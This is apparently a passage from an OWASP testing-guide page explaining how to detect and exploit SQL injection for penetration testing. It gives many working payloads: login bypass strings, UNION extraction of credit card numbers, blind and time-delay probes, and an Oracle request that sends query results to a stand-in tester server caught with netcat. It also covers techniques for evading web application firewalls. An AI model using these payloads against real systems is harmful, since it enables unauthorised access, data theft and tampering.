A successful SQL injection attack can  read sensitive data from the database, modify database data  (insert/update/delete), execute administration operations on the  database (such as shutdown the DBMS), recover the content of a given  file existing on the DBMS file system or write files into the file  system, and, in some cases, issue commands to the operating system. SQL  injection attacks are a type of <a href="https://www.owasp.org/index.php?title=Injection_attack&action=edit&redlink=1">injection attack</a>, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands. <br /><br /> In general the way web applications construct SQL statements involving  SQL syntax written by the programmers is mixed with user-supplied data.  Example: <br />select title, text from news where id=$id<br /> In the example above the variable $id contains user-supplied data, while  the remainder is the SQL static part supplied by the programmer; making  the SQL statement dynamic. <br /><br />  Because the way it was constructed, the user can supply crafted input  trying to make the original SQL statement execute further actions of the  user's choice. The example below illustrates the user-supplied data “10  or 1=1”, changing the logic of the SQL statement, modifying the WHERE  clause adding a condition “or 1=1”. <br /><br />  <br />select title, text from news where id=10 or 1=1<br /> SQL Injection attacks can be divided into the following three classes: <br />•  Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.<br />•  Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).<br />•  Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.<br /><br /> A successful SQL Injection attack requires the attacker to craft a  syntactically correct SQL Query. If the application returns an error  message generated by an incorrect query, then it may be easier for an  attacker to reconstruct the logic of the original query and, therefore,  understand how to perform the injection correctly. However, if the  application hides the error details, then the tester must be able to  reverse engineer the logic of the original query.  <br /><br /> About the techniques to exploit SQL injection flaws there are five  commons techniques. Also those techniques sometimes can be used in a  combined way (e.g. union operator and out-of-band): <br />•  Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.<br />•  Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.<br />•  Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.<br />•  Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).<br />•  Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.<br /><br /><h2>How to Test</h2><br /><br /><h3>Detection Techniques</h3><br />The first step in this test is to understand when the application  interacts with a DB Server in order to access some data. Typical  examples of cases when an application needs to talk to a DB include: <br />•  Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).<br />•  Search engines: the string submitted by the user could be used in a SQL query that extracts all relevant records from a database.<br />•  E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a  database.<br /><br /> The tester has to make a list of all input fields whose values could be  used in crafting a SQL query, including the hidden fields of POST  requests and then test them separately, trying to interfere with the  query and to generate an error. Consider also HTTP headers and Cookies.  <br /><br /> The very first test usually consists of adding a single quote (') or a  semicolon (;) to the field or parameter under test. The first is used in  SQL as a string terminator and, if not filtered by the application,  would lead to an incorrect query. The second is used to end a SQL  statement and, if it is not filtered, it is also likely to generate an  error. The output of a vulnerable field might resemble the following (on  a Microsoft SQL Server, in this case): <br />Microsoft OLE DB Provider for ODBC Drivers error '80040e14'<br />[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the <br />character string ''.<br />/target/target.asp, line 113<br /> Also comment delimiters (-- or /* */, etc) and other SQL keywords like  'AND' and 'OR' can be used to try to modify the query. A very simple but  sometimes still effective technique is simply to insert a string where a  number is expected, as an error like the following might be generated: <br /> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'<br />[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the<br />varchar value 'test' to a column of data type int.<br />/target/target.asp, line 113<br /><br /> Monitor all the responses from the web server and have a look at the  HTML/javascript source code. Sometimes the error is present inside them  but for some reason (e.g. javascript error, HTML comments, etc) is not  presented to the user. A full error message, like those in the examples,  provides a wealth of information to the tester in order to mount a  successful injection attack. However, applications often do not provide  so much detail: a simple '500 Server Error' or a custom error page might  be issued, meaning that we need to use blind injection techniques. In  any case, it is very important to test each field separately: only one  variable must vary while all the other remain constant, in order to  precisely understand which parameters are vulnerable and which are not. <br /><br /> <br /><br /><h3>Standard SQL Injection Testing</h3><br /><br /><h3>Example 1 (classical SQL Injection):</h3><br />Consider the following SQL query: <br />SELECT * FROM Users WHERE Username='$username' AND Password='$password'<br /> A similar query is generally used from the web application in order to  authenticate a user. If the query returns a value it means that inside  the database a user with that set of credentials exists, then the user  is allowed to login to the system, otherwise access is denied. The  values of the input fields are generally obtained from the user through a  web form. Suppose we insert the following Username and Password values: <br />$username = 1' or '1' = '1$password = 1' or '1' = '1<br /> The query will be: <br />SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' <br /> If we suppose that the values of the parameters are sent to the server  through the GET method, and if the domain of the vulnerable web site is  www.example.com, the request that we'll carry out will be: <br />http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1 <br /> After a short analysis we notice that the query returns a value (or a  set of values) because the condition is always true (OR 1=1). In this  way the system has authenticated the user without knowing the username  and password.<br /> <em>In some systems the first row of a user table would be an administrator user. This may be the profile returned in some cases.</em> Another example of query is the following: <br />SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password'))) <br /> In this case, there are two problems, one due to the use of the  parentheses and one due to the use of MD5 hash function. First of all,  we resolve the problem of the parentheses. That simply consists of  adding a number of closing parentheses until we obtain a corrected  query. To resolve the second problem, we try to evade the second  condition. We add to our query a final symbol that means that a comment  is beginning. In this way, everything that follows such symbol is  considered a comment. Every DBMS has its own syntax for comments,  however, a common symbol to the greater majority of the databases is /*.  In Oracle the symbol is "--". This said, the values that we'll use as  Username and Password are: <br />$username = 1' or '1' = '1'))/*$password = foo<br /> In this way, we'll get the following query: <br />SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password'))) (Due to the inclusion of a comment delimiter in the $username value the password portion of the query will be ignored.) <br /><br /> The URL request will be: <br />http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo <br /> This may return a number of values. Sometimes, the authentication code  verifies that the number of returned records/results is exactly equal to  1. In the previous examples, this situation would be difficult (in the  database there is only one value per user). In order to go around this  problem, it is enough to insert a SQL command that imposes a condition  that the number of the returned results must be one. (One record  returned) In order to reach this goal, we use the operator "LIMIT  &lt;num&gt;", where &lt;num&gt; is the number of the results/records  that we want to be returned. With respect to the previous example, the  value of the fields Username and Password will be modified as follows: <br />$username = 1' or '1' = '1')) LIMIT 1/* $password = foo <br /> In this way, we create a request like the follow: <br />http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo <br />   <br /><br /><h3>Example 2 (simple SELECT statement):</h3><br />Consider the following SQL query: <br />SELECT * FROM products WHERE id_product=$id_product<br />  Consider also the request to a script who executes the query above: <br />http://www.example.com/product.php?id=10<br />  When the tester tries a valid value (e.g. 10 in this case), the  application will return the description of a product. A good way to test  if the application is vulnerable in this scenario is play with logic,  using the operators AND and OR. <br /><br />  Consider the request: <br />http://www.example.com/product.php?id=10 AND 1=2<br />  <br />SELECT * FROM products WHERE id_product=10 AND 1=2<br />  In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result: <br />http://www.example.com/product.php?id=10 AND 1=1<br />  <br /><br /><h3>Example 3 (Stacked queries):</h3><br />Depending on the API which the web application is using and the DBMS  (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute  multiple queries in one call. <br /><br /> Consider the following SQL query: <br />SELECT * FROM products WHERE id_product=$id_product<br />  A way to exploit the above scenario would be: <br />http://www.example.com/product.php?id=10; INSERT INTO users (…)<br />  This way is possible to execute many queries in a row and independent of the first query. <br /><br />  <br /><br /><h3>Fingerprinting the Database</h3><br />Even though the SQL language is a standard, every DBMS has its  peculiarity and differs from each other in many aspects like special  commands, functions to retrieve data such as users names and databases,  features, comments line etc. <br /><br />  When the testers move to a more advanced SQL injection exploitation they need to know what the back end database is. <br />1) The first way to find out what back end database is used is by  observing the error returned by the application. The following are some  examples of error messages: <br /><br /> MySql: <br />You have an error in your SQL syntax; check the manual<br />that corresponds to your MySQL server version for the<br />right syntax to use near '\'' at line 1One complete UNION SELECT with version() can also help to know the back end database. <br /> SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1<br /> Oracle: <br />ORA-00933: SQL command not properly ended<br /> MS SQL Server: <br />Microsoft SQL Native Client error ‘80040e14’<br />Unclosed quotation mark after the character string SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1<br />  PostgreSQL: <br />Query failed: ERROR: syntax error at or near<br />"’" at character 56 in /www/site/test.php on line 121.<br />  2) If there is no error message or a custom error message, the tester  can try to inject into string fields using varying concatenation  techniques: <br /><br />  MySql:  ‘test’ + ‘ing’ <br />SQL Server: ‘test’ ‘ing’ <br />Oracle: ‘test’||’ing’ <br />PostgreSQL: ‘test’||’ing’ <br /><br /><h3>Exploitation Techniques</h3><br /><br /><h3>Union Exploitation Technique</h3><br />The UNION operator is used in SQL injections to join a query,  purposely forged by the tester, to the original query. The result of the  forged query will be joined to the result of the original query,  allowing the tester to obtain the values of columns of other tables.  Suppose for our examples that the query executed from the server is the  following: <br /><br />  <br />SELECT Name, Phone, Address FROM Users WHERE Id=$id<br />  We will set the following $id value: <br /><br />  <br />$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable<br />  We will have the following query: <br /><br />  <br />SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable<br />  Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword <strong>ALL</strong>  is necessary to get around queries that use the keyword DISTINCT.  Moreover, we notice that beyond the credit card numbers, we have  selected two other values. These two values are necessary because the  two queries must have an equal number of parameters/columns in order to  avoid a syntax error. <br /><br />  The first detail a tester needs to exploit the SQL injection  vulnerability using such technique is to find the right numbers of  columns in the SELECT statement. <br /><br />  In order to achieve this the tester can use ORDER BY clause followed by a  number indicating the numeration of database’s column selected: <br /><br />  <br />http://www.example.com/product.php?id=10 ORDER BY 10--<br />  If the query executes with success the tester can assume, in this  example, there are 10 or more columns in the SELECT statement. If the  query fails then there must be fewer than 10 columns returned by the  query. If there is an error message available, it would probably be: <br /><br />  <br />Unknown column '10' in 'order clause'<br />  After the tester finds out the numbers of columns, the next step is to  find out the type of columns. Assuming there were 3 columns in the  example above, the tester could try each column type, using the NULL  value to help them: <br /><br />  <br />http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--<br />  If the query fails, the tester will probably see a message like: <br />All cells in a column must have the same datatypeIf the query executes with success, the first column can be an integer. Then the tester can move further and so on: <br />http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--<br /> After the successful information gathering, depending on the  application, it may only show the tester the first result, because the  application treats only the first line of the result set. In this case,  it is possible to use a LIMIT clause or the tester can set an invalid  value, making only the second query valid (supposing there is no entry  in the database which ID is 99999): <br /><br />  <br />http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--<br /><h3>Boolean Exploitation Technique</h3><br />The Boolean exploitation technique is very useful when the tester finds a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection">Blind SQL Injection</a>  situation, in which nothing is known on the outcome of an operation.  For example, this behavior happens in cases where the programmer has  created a custom error page that does not reveal anything on the  structure of the query or on the database. (The page does not return a  SQL error, it may just return a HTTP 500, 404, or redirect). <br /> <br /><br /> By using inference methods, it is possible to avoid this obstacle and  thus to succeed in recovering the values of some desired fields. This  method consists of carrying out a series of boolean queries against the  server, observing the answers and finally deducing the meaning of such  answers. We consider, as always, the www.example.com domain and we  suppose that it contains a parameter named id vulnerable to SQL  injection. This means that carrying out the following request: <br /><br />  <br />http://www.example.com/index.php?id=1'<br /> We will get one page with a custom message error which is due to a  syntactic error in the query. We suppose that the query executed on the  server is: <br /><br />  <br />SELECT field1, field2, field3 FROM Users WHERE Id='$Id' <br /><br /> Which is exploitable through the methods seen previously. What we want  to obtain is the values of the username field. The tests that we will  execute will allow us to obtain the value of the username field,  extracting such value character by character. This is possible through  the use of some standard functions, present in practically every  database. For our examples, we will use the following pseudo-functions: <br /><br />  <strong>SUBSTRING (text, start, length)</strong>: returns a substring starting from the position "start" of text and of length "length". If "start" is greater than the length of text, the function returns a null value. <br /><br />  <strong>ASCII (char)</strong>: it gives back ASCII value of the input character. A null value is returned if char is 0. <br /><br />  <strong>LENGTH (text)</strong>: it gives back the number of characters in the input text. <br /><br />  Through such functions, we will execute our tests on the first character  and, when we have discovered the value, we will pass to the second and  so on, until we will have discovered the entire value. The tests will  take advantage of the function SUBSTRING, in order to select only one  character at a time (selecting a single character means to impose the  length parameter to 1), and the function ASCII, in order to obtain the  ASCII value, so that we can do numerical comparison. The results of the  comparison will be done with all the values of the ASCII table, until  the right value is found. As an example, we will use the following value  for <em>Id</em>: <br /><br />  <br />$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1 <br /><br /> That creates the following query (from now on, we will call it "inferential query"): <br /><br />  <br />SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'<br /><br /> The previous example returns a result if and only if the first character  of the field username is equal to the ASCII value 97. If we get a false  value, then we increase the index of the ASCII table from 97 to 98 and  we repeat the request. If instead we obtain a true value, we set to zero  the index of the ASCII table and we analyze the next character,  modifying the parameters of the SUBSTRING function. The problem is to  understand in which way we can distinguish tests returning a true value  from those that return false. To do this, we create a query that always  returns false. This is possible by using the following value for <em>Id</em>: <br /><br />  <br />$Id=1' AND '1' = '2 <br /><br /> Which will create the following query: <br /><br />  <br />SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2' <br /><br /> The obtained response from the server (that is HTML code) will be the  false value for our tests. This is enough to verify whether the value  obtained from the execution of the inferential query is equal to the  value obtained with the test executed before. Sometimes, this method  does not work. If the server returns two different pages as a result of  two identical consecutive web requests, we will not be able to  discriminate the true value from the false value. In these particular  cases, it is necessary to use particular filters that allow us to  eliminate the code that changes between the two requests and to obtain a  template. Later on, for every inferential request executed, we will  extract the relative template from the response using the same function,  and we will perform a control between the two templates in order to decide the result of the test. <br /><br />  In the previous discussion, we haven't dealt with the problem of  determining the termination condition for out tests, i.e., when we  should end the inference procedure. A techniques to do this uses one  characteristic of the SUBSTRING function and the LENGTH function. When  the test compares the current character with the ASCII code 0 (i.e., the  value null) and the test returns the value true, then either we are  done with the inference procedure (we have scanned the whole string), or  the value we have analyzed contains the null character. <br /><br />  We will insert the following value for the field <em>Id</em>: <br /><br />  <br />$Id=1' AND LENGTH(username)=N AND '1' = '1 <br /><br /> Where N is the number of characters that we have analyzed up to now (not counting the null value). The query will be: <br /><br />  <br />SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1' <br /><br /> The query returns either true or false. If we obtain true, then we have  completed the inference and, therefore, we know the value of the  parameter. If we obtain false, this means that the null character is  present in the value of the parameter, and we must continue to analyze  the next parameter until we find another null value. <br /><br />  The blind SQL injection attack needs a high volume of queries. The  tester may need an automatic tool to exploit the vulnerability. <br /><br />  <br /><br /><h3>Error based Exploitation technique</h3><br />An Error based exploitation technique is useful when the tester for  some reason can’t exploit the SQL injection vulnerability using other  technique such as UNION. The Error based technique consists in forcing  the database to perform some operation in which the result will be an  error. The point here is to try to extract some data from the database  and show it in the error message. This exploitation technique can be  different from DBMS to DBMS (check DBMS specific section). <br /><br />  Consider the following SQL query: <br /><br />  <br />SELECT * FROM products WHERE id_product=$id_product<br />  Consider also the request to a script who executes the query above: <br /><br />  <br />http://www.example.com/product.php?id=10<br />  The malicious request would be (e.g. Oracle 10g): <br /><br />  <br />http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--<br />  In this example, the tester is concatenating the value 10 with the  result of the function UTL_INADDR.GET_HOST_NAME. This Oracle function  will try to return the host name of the parameter passed to it, which is  other query, the name of the user. When the database looks for a host  name with the user database name, it will fail and return an error  message like: <br /><br />  <br />ORA-292257: host SCOTT unknown<br />  Then the tester can manipulate the parameter passed to GET_HOST_NAME()  function and the result will be shown in the error message. <br /><br />  <br /><br /><h3>Out of band Exploitation technique</h3><br />This technique is very useful when the tester find a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection">Blind SQL Injection</a>  situation, in which nothing is known on the outcome of an operation.  The technique consists of the use of DBMS functions to perform an out of  band connection and deliver the results of the injected query as part  of the request to the tester’s server. Like the error based techniques,  each DBMS has its own functions. Check for specific DBMS section. <br /><br />  Consider the following SQL query: <br /><br />  <br />SELECT * FROM products WHERE id_product=$id_product<br />  Consider also the request to a script who executes the query above: <br /><br />  <br />http://www.example.com/product.php?id=10<br />  The malicious request would be: <br /><br />  <br />http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--<br />  In this example, the tester is concatenating the value 10 with the  result of the function UTL_HTTP.request. This Oracle function will try  to connect to ‘testerserver’ and make a HTTP GET request containing the  return from the query “SELECT user FROM DUAL”.  The tester can set up a  webserver (e.g. Apache) or use the Netcat tool: <br /><br />  <br />/home/tester/nc –nLp 80<br /> <br />GET /SCOTT HTTP/1.1<br />Host: testerserver.com<br />Connection: close<br /><h3>Time delay Exploitation technique</h3><br />The time delay exploitation technique is very useful when the tester find a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection">Blind SQL Injection</a>  situation, in which nothing is known on the outcome of an operation.  This technique consists in sending an injected query and in case the  conditional is true, the tester can monitor the time taken to for the  server to respond. If there is a delay, the tester can assume the result  of the conditional query is true. This exploitation technique can be  different from DBMS to DBMS (check DBMS specific section). <br /><br /> Consider the following SQL query: <br /><br />  <br />SELECT * FROM products WHERE id_product=$id_product<br />  Consider also the request to a script who executes the query above: <br /><br />  <br />http://www.example.com/product.php?id=10<br />  The malicious request would be (e.g. MySql 5.x): <br /><br />  <br />http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--<br />  In this example the tester is checking whether the MySql version is 5.x  or not, making the server to delay the answer by 10 seconds. The tester  can increase the delay time and monitor the responses. The tester also  doesn’t need to wait for the response. Sometimes he can set a very high  value (e.g. 100) and cancel the request after some seconds. <br /><br /><h3>Stored Procedure Injection</h3><br />When using dynamic SQL within a stored procedure, the application  must properly sanitize the user input to eliminate the risk of code  injection. If not sanitized, the user could enter malicious SQL that  will be executed within the stored procedure. <br /><br />  Consider the following <strong>SQL Server Stored Procedure:</strong> <br /> <br />Create procedure user_login @username varchar(20), @passwd varchar(20) <br />As<br />Declare @sqlstring varchar(250)<br />Set @sqlstring  = ‘<br />Select 1 from users<br />Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd<br />exec(@sqlstring)<br />Go<br />User input: <br />anyusername or 1=1'<br />anypassword<br />This procedure does not sanitize the input, therefore allowing the  return value to show an existing record with these parameters.<br /> <br /> <br />NOTE: This example may seem unlikely due to the use of dynamic  SQL to log in a user, but consider a dynamic reporting query where the  user selects the columns to view. The user could insert malicious code  into this scenario and compromise the data. <br /> <br />Consider the following <strong>SQL Server Stored Procedure:</strong> <br /> <br />Create<br />procedure get_report @columnamelist varchar(7900)<br />As<br />Declare @sqlstring varchar(8000)<br />Set @sqlstring  = ‘<br />Select ‘ + @columnamelist + ‘ from ReportTable‘<br />exec(@sqlstring)<br />Go<br />User input: <br />1 from users; update users set password = 'password'; select *<br />This will result in the report running and all users’ passwords being updated. <br /><br /> <br /><br /><h3>Automated Exploitation</h3><br />Most of the situation and techniques presented here can be performed  in a automated way using some tools. In this article the tester can find  information how to perform an automated auditing using SQLMap: <br /><a href="https://www.owasp.org/index.php/Automated_Audit_using_SQLMap">https://www.owasp.org/index.php/Automated_Audit_using_SQLMap</a> <br /><br /> <br /><br /><h3>SQL Injection signature Evasion Techniques</h3><br />The techniques are used to bypass defenses such as Web application firewalls (WAFs) or intrusion prevention systems (IPSs).

For example  <br /> or 'a'='a'  or 'a'  =    'a' Adding special character like new line or tab that won't change the SQL statement execution. For example,  <br /> <br />or <br />'a'=<br />      'a' <br /><h3>Null Bytes</h3><br />Use null byte (%00) prior to any characters that the filter is blocking. <br />For example, if the attacker may inject the following SQL  <br />' UNION SELECT password FROM Users WHERE username='admin'--<br />to add Null Bytes will be  <br />%00' UNION SELECT password FROM Users WHERE username='admin'--<br /><br /><h3>SQL Comments</h3><br />Adding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as example. <br />' UNION SELECT password FROM Users WHERE name='admin'--<br />Adding SQL inline comments will be. <br />'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--<br />'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--<br /><br /><h3>URL Encoding</h3><br />Use the online URL encoding to encode the SQL statement <br /><a href="http://meyerweb.com/eric/tools/dencoder/">http://meyerweb.com/eric/tools/dencoder/</a> <br />' UNION SELECT password FROM Users WHERE name='admin'--<br />The URL encoding of the SQL injection statement will be  <br />%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--<br /><br /><h3>Character Encoding</h3><br />Char() function can be used to replace English char. For example, char(114,111,111,116) means root <br />' UNION SELECT password FROM Users WHERE name='root'--<br />To apply the Char(), the SQL injeciton statement will be  <br />' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--<br /><br /> <br /><br /><h3>String Concatenation</h3><br />Concatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on database engine.  Take MS SQL engine as an example <br />   select 1<br />The simple SQL statement can be changed as below by using concatenation <br />   EXEC('SEL' + 'ECT 1')<br /><br /> <br /><br /><h3>Hex Encoding</h3><br />Hex encoding technique uses Hexadecimal encoding to replace original SQL statement char. For example, 'root' can be represented as 726F6F74 <br />      Select user from users where name = 'root'<br />The SQL statement by using HEX value will be: <br />      Select user from users where name = 726F6F74<br />or <br />      Select user from users where name = unhex('726F6F74')<br /><br /> <br /><br /><h3>Declare variables</h3><br />Declare the SQL injection statement into variable and execute it. <br />For example, SQL injection statement below <br />   Union Select password<br />Define the SQL statement into variable SQLivar <br /> ; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password'); <br />EXEC(@SQLivar) <br /><br /><h3>Alternative Expression of 'or 1 = 1'</h3><br />•  OR 'SQLi' = 'SQL'+'i' <br />•  OR 'SQLi' &gt; 'S' <br />•  or 20 &gt; 1<br />•  OR 2 between 3 and 1  <br />•  OR 'SQLi' = N'SQLi'<br />•  1 and 1 = 1<br />•  1 || 1 = 1  <br />•  1 &amp;&amp; 1 = 1<br /><br /><h2>Tools</h2><br />•  SQL Injection Fuzz Strings (from wfuzz tool) - <a href="https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/SQL.txt">https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/SQL.txt</a><br />•  <a href="https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project">OWASP SQLiX</a><br />•  Francois Larouche: Multiple DBMS SQL Injection tool - <a href="http://www.sqlpowerinjector.com/index.htm">SQL Power Injector</a><br /><br />•  ilo--, Reversing.org - <a href="http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html">sqlbftools</a><br /><br />•  Bernardo Damele A.
